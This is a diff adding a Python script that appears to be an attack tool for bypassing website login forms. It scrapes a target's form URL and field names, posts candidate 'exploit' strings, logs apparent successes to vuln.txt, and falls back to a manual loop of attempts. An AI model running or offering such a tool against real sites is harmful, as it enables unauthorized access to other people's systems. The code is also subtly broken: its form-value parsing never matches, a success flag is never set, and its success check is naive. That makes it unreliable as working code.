@@ -1,0 +1,119 @@
+import requests
+import re
+import logging
+
+# Function to extract the post URL from the page
+def get_post_url(ng):
+    try:
+        posturl_matches = re.findall(r"post\('[^']*'|POST\('[^']*'|action=\"[^\"]*\"", ng)
+        if posturl_matches:
+            return sorted(set([re.sub(r"action=\"|post\('|'\"", '', u) for u in posturl_matches]))[0]
+    except Exception as e:
+        logging.error(f"Error extracting post URL: {e}")
+        return None
+
+# Function to attempt login with different exploits
+def attempt_login(target, exploits, post_url, form_data):
+    for xploit in exploits:
+        logging.info(f"Attempting login with: {xploit}")
+
+        try:
+            postdata = f"{form_data['param1']}={xploit}&{form_data['param2']}={xploit}{form_data['value']}"
+            response = requests.post(post_url, data=postdata, timeout=10)
+            
+            # Check if login attempt was successful
+            if response.status_code == 200 and not re.search(r"error|invalid", response.text, re.I):
+                logging.info(f"Login successful with {xploit}!")
+                return True
+            else:
+                logging.warning(f"Failed login attempt with: {xploit}")
+        except requests.exceptions.RequestException as e:
+            logging.error(f"Request failed: {e}")
+            continue
+
+    return False
+
+# Main bypass function
+def bypass(target, exploits, list_xploit=None):
+    logging.basicConfig(level=logging.INFO)
+    sukses = ""
+    postnya = ""
+    post = ""
+    posturl = ""
+
+    logging.info(f"Starting {target}")
+
+    # Clean up target URL
+    site = target.replace("http://", "").replace("https://", "")
+    
+    try:
+        ng = requests.get(f"http://{site}", timeout=10).text
+    except requests.exceptions.RequestException as e:
+        logging.error(f"Error accessing the target site: {e}")
+        return
+
+    # Extract the POST URL
+    post_url = get_post_url(ng)
+    if post_url:
+        logging.info(f"Post URL found: {post_url}")
+
+        # Extract form parameters (e.g., username, password fields)
+        value_matches = re.findall(r'(<input).*?(>)', ng)
+        values = []
+        for match in value_matches:
+            name_value = re.findall(r'name="([^"]*)" value="([^"]*)"', match[1])
+            if name_value:
+                values.extend(name_value)
+        
+        value = "&".join([f"{name}={val}" for name, val in values])
+
+        # Define the form fields to test (username, password, etc.)
+        param = ",".join(sorted(set(re.findall(r'name="([^"]*)"', ng)[:2])))
+        param1, param2 = param.split(",") if len(param.split(",")) > 1 else (param, '')
+        
+        form_data = {
+            "param1": param1,
+            "param2": param2,
+            "value": value
+        }
+
+        # Attempt to login with the provided exploits
+        if attempt_login(target, exploits, post_url, form_data):
+            logging.info(f"Exploit Successful for {target}")
+            with open("vuln.txt", "a") as f:
+                f.write(f"+++++++++++++++++++++!!![ Login Success ]!!!+++++++++++++++++++++\nSite: {target} \nLogin: {exploits}\n")
+            print(f"[INFO] Login successful. Saved to vuln.txt.")
+        else:
+            logging.warning("Login failed. Attempting semi-manual exploitation.")
+
+            # If the automatic exploit fails, let the user attempt semi-manual entry
+            param1 = input("Enter parameter name to test: ")
+            while True:
+                xploit = input("\nTrying login with: ")
+                logging.info(f"Posting to {post_url}")
+
+                if "," in param1:
+                    param2 = f"&{param1.split(',')[1]}={xploit}"
+                    param0 = param1.split(',')[0]
+                    postdata = f"{param0}={xploit}{param2}{value}"
+                    response = requests.post(post_url, data=postdata, timeout=10)
+                    
+                    if re.search(r"(error|invalid|wrong)", response.text, re.I):
+                        logging.warning(f"Failed login attempt with: {xploit}")
+                    else:
+                        logging.info(f"Login successful with {xploit}")
+                        break
+                else:
+                    break
+    else:
+        logging.error("No valid POST URL found.")
+
+    if not sukses:
+        logging.info("Could not bypass site or encountered postdata errors.")
+
+# Main entry point
+if __name__ == "__main__":
+    target = input("Enter target URL: ")
+    exploits = ["user1@gmail.com", "user2@gmail.com", "test"]  # Example exploit credentials
+    list_xploit = None  # You can provide a path to an external exploit list if available
+    bypass(target, exploits, list_xploit)
